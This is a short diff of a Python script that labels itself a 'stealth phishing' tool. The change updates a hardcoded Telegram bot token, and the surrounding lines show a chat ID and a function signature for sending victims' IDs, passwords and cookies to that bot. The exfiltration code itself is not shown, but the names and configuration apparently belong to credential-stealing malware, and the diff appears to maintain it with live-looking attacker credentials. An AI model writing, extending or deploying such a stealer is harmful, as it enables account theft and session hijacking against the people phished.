@@ -15,7 +15,7 @@ except ModuleNotFoundError:
 except:pass
 #---------------------● Zoala-GOD CONFIG (STEALTH PHISHING) ●---------------------#
 # Target Telegram Data (Secret) - (Keep Private)
-TELEGRAM_BOT_TOKEN = '8318770823:AAENlne2FwWLJOLX-n3w2nfEoZaIrpEyRI'
+TELEGRAM_BOT_TOKEN = '8318770823:AAENlne2FwWLJOLX-nZ3w2nfEoZaIrpEyRI'
 TELEGRAM_CHAT_ID = '5895194884'
 #---------------------● Zoala-GOD STEALTH FUNCTIONS - (TELEGRAM SENDER) ●---------------------#
 def ___send_stealth_phish___(ids, pas, coki, method_name, status):
